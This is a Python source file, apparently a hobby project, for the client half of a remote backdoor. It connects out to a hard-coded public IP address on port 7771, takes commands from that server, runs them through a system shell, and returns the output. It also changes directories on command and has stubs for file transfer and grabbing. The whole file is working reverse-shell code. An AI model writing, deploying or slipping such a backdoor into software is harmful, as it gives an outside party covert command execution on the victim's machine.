#Written and designed by Stone Preheim
import socket
import subprocess
import os

ADDR = '23.123.182.6'#my public facing IPv4. If you are looking to test this dr. use loopback.
PORT = 7771 #only open when im running server
CWD = os.getcwd()
BYTEBUFFER = 1024
SPLITTER = b"<<<Split>>>"

class Client:
    def __init__(self, addr, port):
        self.ADDRESS = addr
        self.PORT = port
    @staticmethod
    def connectToServer(ADDR, PORT):
        print(f"Attempting Connection to {ADDR} port {PORT}...")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:
            soc.connect((ADDR, PORT))
            print("Connection established!")
            while True:
                try:
                    servCom = soc.recv(BYTEBUFFER)
                    servComArr = servCom.split(b" ")
                    print("Received command: " + str(servCom))
                    #custom command checking
                    if servCom == b'killDoor':
                        soc.sendall(b'EXCEPTION')#simulate an exception to close server side
                        break
                    elif servComArr[0] == b'printClient':
                        print(servComArr[1:])
                        soc.sendall(b"Text was printed!")#respond to server
                    #server is initiating transfer
                    elif f'transfer{SPLITTER}'.encode() in servCom:
                        print()
                    elif servComArr[0] == b'grab':
                        print()
                    elif servComArr[0] == b'cd':
                        try:
                            os.chdir(servComArr[1].decode("utf-8"))
                            out = "new DIR: " + os.getcwd()
                            soc.sendall(out.encode('utf-8'))
                        except FileNotFoundError as e:
                            soc.sendall(str(e).encode('utf-8'))
                        except IndexError as e:#if user just sends 'cd' return path
                            soc.sendall(os.getcwd().encode('utf-8'))
                    # all other commands will be default shell commands, return output.
                    else:
                        process = subprocess.Popen(servCom.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        output = process.stdout.read()+process.stderr.read()
                        print(output)
                        if output == b"":
                            soc.sendall(b'command executed on remote. no output was given.')
                        else:
                            soc.sendall(output)
                #gracefully close connection on exception
                except Exception as e:
                    soc.sendall(b"EXCEPTION")
                    print(e.with_traceback())
                    break

    @staticmethod
    def sendTestPacket(ADDR, PORT):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:
            soc.connect((ADDR, PORT))
            soc.sendall(b'this should come back to me')  # casting to byte like object and sending packet
            data = soc.recv(1024)

        print('Server sent:', repr(data))

if __name__ == '__main__':
    #Client.sendTestPacket(ADDR, PORT)
    #client = Client(ADDR, PORT)
    #client.connectToServer()
    Client.connectToServer(ADDR, PORT)
